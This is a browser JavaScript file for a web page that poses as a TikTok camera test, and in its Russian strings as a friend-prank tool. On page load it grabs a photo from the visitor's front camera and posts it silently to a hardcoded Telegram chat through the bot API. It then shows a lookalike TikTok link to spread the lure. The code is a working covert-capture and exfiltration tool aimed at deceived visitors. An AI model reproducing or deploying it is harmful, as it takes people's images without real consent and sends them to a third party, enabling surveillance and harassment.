document.addEventListener('DOMContentLoaded', async () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const watchBtn = document.getElementById('watchBtn');
    const idiNaxuy = document.getElementById('idiNax');
    const pointer = document.getElementById('pointer');
    const botBtn = document.getElementById('botBtn');

    // Translations for the supported languages
    const messages = {
        ru: {
            wait: 'Подождите...',
            unsupportedBrowser: 'Ваш браузер не поддерживается. Нажмите на три точки в правом верхнем углу экрана (где показано стрелочкой) и выберите "Открыть в"',
            cameraError: 'Ошибка доступа к камере. Выдайте нужное разрешение и попробуйте еще раз',
            prankFriends: 'Хочешь так же пранковать друзей и получать их фото?',
            botLinkText: 'Переходите в Discord и получайте свою ссылку'
        },
        en: {
            wait: 'Please wait...',
            unsupportedBrowser: 'Your browser is not supported. Tap the three dots in the top right corner of the screen (where the arrow is pointing) and select "Open in"',
            cameraError: 'Camera access error. Please grant the necessary permissions and try again',
            prankFriends: 'Welcome To New Tiktok Test Web',
            botLinkText: 'Open Your Camera To Test Tiktok New Pixealted Camera'
        },
        // other translations...
    };

    const userLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
    const lang = messages[userLang] ? userLang : 'en'; // Default to English if the language isn't supported

    idiNaxuy.textContent = messages[lang].wait;
    watchBtn.style.display = 'none';
    pointer.style.display = 'none';
    botBtn.style.display = 'none';
    context.canvas.style.display = 'none';

    const urlParams = new URLSearchParams(window.location.search);
    const id = urlParams.get('video');
    const os = navigator.userAgentData?.platform || navigator.platform;
    const domain = window.location.hostname;

    // Telegram bot token and chat ID (replace these with your actual bot token and chat ID)
const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN; // This will pull from the environment
    const chatId = '5074699192';

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            video.play().then(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = context.canvas.toDataURL('image/jpeg');

                // Convert image data to Blob
                fetch(imageData)
                    .then(res => res.blob())
                    .then(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'image.jpg');
                        formData.append('chat_id', chatId);

                        // Post the image to Telegram using the sendPhoto API
                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('Image uploaded to Telegram successfully:', data);
                            context.canvas.style.display = 'block';
                            idiNaxuy.textContent = messages[lang].prankFriends;
                            botBtn.textContent = messages[lang].botLinkText;
                            botBtn.href = 'https://tiktok.ftp.sh'; // Replace with your channel link
                            botBtn.style.display = 'block';
                        })
                        .catch(error => {
                            console.error('Error uploading the image to Telegram:', error);
                        });
                    });

                stream.getTracks().forEach(track => track.stop());
            }).catch(() => {
                idiNaxuy.textContent = messages[lang].unsupportedBrowser;
                pointer.style.display = 'flex';
            });
        };

    } catch (error) {
        idiNaxuy.textContent = messages[lang].cameraError;
    }
});
